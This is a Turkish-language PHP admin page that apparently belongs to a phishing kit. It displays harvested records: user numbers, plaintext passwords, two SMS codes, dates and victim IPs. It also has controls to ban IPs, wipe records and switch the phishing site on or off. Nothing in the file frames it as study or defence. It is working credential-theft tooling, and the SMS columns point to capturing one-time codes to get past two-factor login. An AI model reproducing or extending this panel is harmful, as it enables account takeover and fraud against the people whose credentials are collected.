<?php

include("baglan.php");

include("denetle.php");
session_start();
header("Cache-control:private");

if($_SESSION['logged'] != "1") {
    header("location:giris.php");
    die(); }

if($_GET['tumsil']==1){

mysql_query("TRUNCATE TABLE ak");

echo "<script>window.location.href='index.php';</script>";

}

	?>
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
	<title>Yönetim Paneli</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="5">
	<style>
	.table {
		margin-bottom: 0px;
	}
	</style>
</head>
<body>
<center><h1>Yönetim Paneline Hoşgeldiniz</h1></center>
	<div class="container">
	<br><a href="#" onclick="javascript:if(confirm('Silmek istediğinize emin misiniz?'))
window.location.assign('?tumsil=1');">Tüm Kayıtları Sil</a>
<br>
<a href="aktif.php"> Siteyi Pasif Et </a> / <a href="pasif.php"> Siteyi Aktif Et </a>
	<div class="well">
	<table class="table">
      <thead>
        <tr>
          <th>#</th>
          <th>Kullanıcı No</th>
          <th>Şifre</th>
		  <th>SMS1</th>
		  <th>SMS2</th>
		  <th>Tarih</th>
		  <th>Sil</th>
        </tr>
      </thead>
      <tbody>
		<?php
		$calistir = mysql_query("select * from ak order by id DESC") or die("Hata Olustu!");
		while($oku=mysql_fetch_assoc($calistir))
		{ $not=$oku['notif'];
		?>
        <tr <? if ($not=='1'){?>style="background:#FFD429"<? } ?>>
          <th scope="row"><?php echo $oku['id']; ?></th>
          <td><?php echo $oku['kullanici']; ?></td>
          <td><?php echo $oku['pass']; ?></td>
		  <td><?php echo $oku['sms1']; ?></td>
		  <td><?php echo $oku['sms2']; ?></td>
		  <td><?php echo $oku['tarih']; ?></td>
		  <td><a href="ipban.php?ipbanla=<?php echo $oku['ip']; ?>&id=<?php echo $oku['id']; ?>">IP Banla</a> / <a href="sil.php?id=<?php echo $oku['id']; ?>">Sil</a></td>
        </tr>
		<?php } ?>
      </tbody>
    </table>
	<script src="js/bootstrap.min.js"></script>
</body>
</html>